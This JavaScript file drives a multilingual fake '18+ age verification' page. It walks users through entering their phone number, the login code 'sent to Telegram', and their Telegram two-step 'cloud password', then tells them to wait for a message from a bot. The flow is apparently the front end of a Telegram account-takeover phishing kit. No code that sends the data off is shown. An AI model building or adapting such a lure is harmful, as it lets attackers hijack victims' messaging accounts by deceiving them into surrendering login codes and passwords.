// ===== TRANSLATIONS DICTIONARY =====
const translations = {
    en: {
        badge: "🔞 Age Verification",
        title: "18+ VERIFICATION",
        btnStart: "Verify Now",
        subtext: "⚡ Access restricted to users 18 years or older",
        step1: "Step 1 of 3",
        phoneTitle: "Enter Phone Number",
        phoneDesc: "We will send a verification code to Telegram",
        phoneLabel: "Phone Number",
        btnSendCode: "Send Code",
        btnBack: "← Back",
        step2: "Step 2 of 3",
        codeTitle: "Verification Code",
        codeDesc: "Enter the confirmation code sent to Telegram",
        btnVerifyCode: "Verify Code",
        step3: "Step 3 of 3",
        passTitle: "Cloud Password",
        passDesc: "Two-step verification is enabled for this account",
        passLabel: "Enter Cloud Password",
        btnVerifyPass: "Confirm",
        successTitle: "Verification Successful!",
        successP1: "Your age has been successfully verified.",
        successP2: "Please wait for a message from the bot.",
        btnHome: "Main Page",
        errPhone: "Please enter a valid phone number",
        errCode: "Please enter all 6 digits of the code",
        errPass: "Please enter your cloud password"
    },
    ru: {
        badge: "🔞 Подтверждение возраста",
        title: "ВЕРИФИКАЦИЯ 18+",
        btnStart: "Пройти верификацию",
        subtext: "⚡ Доступ только для пользователей старше 18 лет",
        step1: "Шаг 1 из 3",
        phoneTitle: "Введите номер телефона",
        phoneDesc: "Мы отправим код подтверждения в Telegram",
        phoneLabel: "Номер телефона",
        btnSendCode: "Отправить код",
        btnBack: "← Назад",
        step2: "Шаг 2 из 3",
        codeTitle: "Подтверждение",
        codeDesc: "Введите код, который был отправлен в Telegram",
        btnVerifyCode: "Проверить код",
        step3: "Шаг 3 из 3",
        passTitle: "Облачный пароль",
        passDesc: "Для этого аккаунта включена дополнительная защита",
        passLabel: "Введите облачный пароль",
        btnVerifyPass: "Подтвердить",
        successTitle: "Вы успешно прошли верификацию!",
        successP1: "Ваш возраст успешно подтвержден.",
        successP2: "Ожидайте сообщение от бота.",
        btnHome: "На главную",
        errPhone: "Пожалуйста, введите корректный номер телефона",
        errCode: "Введите все 6 цифр кода",
        errPass: "Введите облачный пароль"
    },
    ar: {
        badge: "🔞 تأكيد العمر",
        title: "توثيق +18",
        btnStart: "ابدأ التوثيق",
        subtext: "⚡ الوصول مقتصر على المستخدمين فوق 18 عاماً",
        step1: "الخطوة 1 من 3",
        phoneTitle: "أدخل رقم الهاتف",
        phoneDesc: "سنرسل رمز التأكيد إلى التليجرام",
        phoneLabel: "رقم الهاتف",
        btnSendCode: "إرسال الرمز",
        btnBack: "رجوع ←",
        step2: "الخطوة 2 من 3",
        codeTitle: "رمز التأكيد",
        codeDesc: "أدخل الرمز المرسل إلى التليجرام",
        btnVerifyCode: "التحقق من الرمز",
        step3: "الخطوة 3 من 3",
        passTitle: "كلمة المرور السحابية",
        passDesc: "المصادقة بخطوتين مفعلة لهذا الحساب",
        passLabel: "أدخل كلمة المرور السحابية",
        btnVerifyPass: "تأكيد",
        successTitle: "تم التوثيق بنجاح!",
        successP1: "تم تأكيد عمرك بنجاح.",
        successP2: "يرجى انتظار رسالة من البوت.",
        btnHome: "الصفحة الرئيسية",
        errPhone: "يرجى إدخال رقم هاتف صحيح",
        errCode: "يرجى إدخال جميع الأرقام الـ 6",
        errPass: "يرجى إدخال كلمة المرور السحابية"
    },
    iq: {
        badge: "🔞 تأكيد العمر",
        title: "توثيق +18",
        btnStart: "بلش التوثيق",
        subtext: "⚡ الدخول فقط للي أعمارهم فوق الـ 18 سنة",
        step1: "الخطوة 1 من 3",
        phoneTitle: "اكتب رقم تليفونك",
        phoneDesc: "راح ندزلك كود التاكيد على التليجرام",
        phoneLabel: "رقم التليفون",
        btnSendCode: "دز الكود",
        btnBack: "رجوع ←",
        step2: "الخطوة 2 من 3",
        codeTitle: "كود التاكيد",
        codeDesc: "اكتب الكود اللي وصلك على التليجرام",
        btnVerifyCode: "افحص الكود",
        step3: "الخطوة 3 من 3",
        passTitle: "الباسورد الغيمي",
        passDesc: "التحقق بخطوتين متفعل بهذا الحساب",
        passLabel: "اكتب الباسورد الغيمي",
        btnVerifyPass: "تاكيد",
        successTitle: "تم التوثيق بنجاح!",
        successP1: "تاكد عمرك بنجاح.",
        successP2: "انتظر رسالة من البوت.",
        btnHome: "للصفحة الرئيسية",
        errPhone: "الرجاء كتابة رقم تليفون صحيح",
        errCode: "اكتب الكود الكرامه متكون من 6 ارقام",
        errPass: "اكتب الباسورد الغيمي"
    },
    fa: {
        badge: "🔞 تایید سن",
        title: "احراز هویت +18",
        btnStart: "شروع احراز هویت",
        subtext: "⚡ دسترسی فقط برای افراد بالای ۱۸ سال",
        step1: "مرحله ۱ از ۳",
        phoneTitle: "شماره تلفن را وارد کنید",
        phoneDesc: "کد تایید به تلگرام شما ارسال خواهد شد",
        phoneLabel: "شماره تلفن",
        btnSendCode: "ارسال کد",
        btnBack: "بازگشت ←",
        step2: "مرحله ۲ از ۳",
        codeTitle: "کد تایید",
        codeDesc: "کد ارسال شده به تلگرام را وارد کنید",
        btnVerifyCode: "تایید کد",
        step3: "مرحله ۳ از ۳",
        passTitle: "رمز عبور ابری",
        passDesc: "تایید دو مرحله‌ای برای این حساب فعال است",
        passLabel: "رمز عبور ابری را وارد کنید",
        btnVerifyPass: "تایید",
        successTitle: "احراز هویت با موفقیت انجام شد!",
        successP1: "سن شما با موفقیت تایید شد.",
        successP2: "لطفا منتظر پیام ربات باشید.",
        btnHome: "صفحه اصلی",
        errPhone: "لطفا یک شماره تلفن معتبر وارد کنید",
        errCode: "لطفا کد ۶ رقمی را به طور کامل وارد کنید",
        errPass: "لطفا رمز عبور ابری را وارد کنید"
    }
};

let currentLang = 'en';
let currentCode = '';

// ===== NAVIGATION & UI =====
function showPage(pageId) {
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    document.getElementById(pageId).classList.add('active');
}

function setLanguage(lang) {
    currentLang = lang;
    const dict = translations[lang] || translations.en;
    
    if (['ar', 'iq', 'fa'].includes(lang)) {
        document.documentElement.setAttribute('dir', 'rtl');
    } else {
        document.documentElement.setAttribute('dir', 'ltr');
    }

    document.querySelectorAll('[data-i18n]').forEach(el => {
        const key = el.getAttribute('data-i18n');
        if (dict[key]) {
            el.textContent = dict[key];
        }
    });
}

// ===== PINPAD LOGIC =====
function updatePinDisplay() {
    const dots = document.querySelectorAll('.pin-dot');
    const hiddenInput = document.getElementById('codeInput');
    hiddenInput.value = currentCode;

    dots.forEach((dot, index) => {
        if (index < currentCode.length) {
            dot.textContent = currentCode[index];
            dot.classList.add('filled');
            dot.classList.remove('active');
        } else if (index === currentCode.length) {
            dot.textContent = '';
            dot.classList.add('active');
            dot.classList.remove('filled');
        } else {
            dot.textContent = '';
            dot.classList.remove('filled', 'active');
        }
    });
}

// ===== EVENT LISTENERS =====
document.addEventListener('DOMContentLoaded', () => {

    // Language switcher
    const langSelect = document.getElementById('langSelect');
    langSelect.addEventListener('change', (e) => {
        setLanguage(e.target.value);
    });

    // Navigation
    document.getElementById('btnGetStarted').addEventListener('click', () => showPage('page-phone'));
    document.getElementById('btnBackFromPhone').addEventListener('click', () => showPage('page-main'));
    document.getElementById('btnBackFromCode').addEventListener('click', () => showPage('page-phone'));
    document.getElementById('btnBackFromPassword').addEventListener('click', () => showPage('page-code'));
    document.getElementById('btnReset').addEventListener('click', () => {
        currentCode = '';
        updatePinDisplay();
        showPage('page-main');
    });

    // Keypad handlers
    document.querySelectorAll('.keypad-btn[data-val]').forEach(btn => {
        btn.addEventListener('click', () => {
            if (currentCode.length < 6) {
                currentCode += btn.getAttribute('data-val');
                updatePinDisplay();
                document.getElementById('codeError').textContent = '';
            }
        });
    });

    document.getElementById('keypadDelete').addEventListener('click', () => {
        if (currentCode.length > 0) {
            currentCode = currentCode.slice(0, -1);
            updatePinDisplay();
        }
    });

    document.getElementById('keypadClear').addEventListener('click', () => {
        currentCode = '';
        updatePinDisplay();
    });

    // Form 1: Phone
    document.getElementById('form-phone').addEventListener('submit', (e) => {
        e.preventDefault();
        const phone = document.getElementById('phoneInput').value.trim();
        const errorEl = document.getElementById('phoneError');

        if (!phone || phone.length < 5) {
            errorEl.textContent = translations[currentLang].errPhone;
            return;
        }
        errorEl.textContent = '';
        showPage('page-code');
    });

    // Form 2: Code
    document.getElementById('form-code').addEventListener('submit', (e) => {
        e.preventDefault();
        const errorEl = document.getElementById('codeError');

        if (currentCode.length !== 6) {
            errorEl.textContent = translations[currentLang].errCode;
            return;
        }
        errorEl.textContent = '';
        showPage('page-password');
    });

    // Form 3: Password
    document.getElementById('form-password').addEventListener('submit', (e) => {
        e.preventDefault();
        const pass = document.getElementById('passwordInput').value.trim();
        const errorEl = document.getElementById('passwordError');

        if (!pass) {
            errorEl.textContent = translations[currentLang].errPass;
            return;
        }
        errorEl.textContent = '';
        showPage('page-success');
    });

    // Initial state
    updatePinDisplay();
});
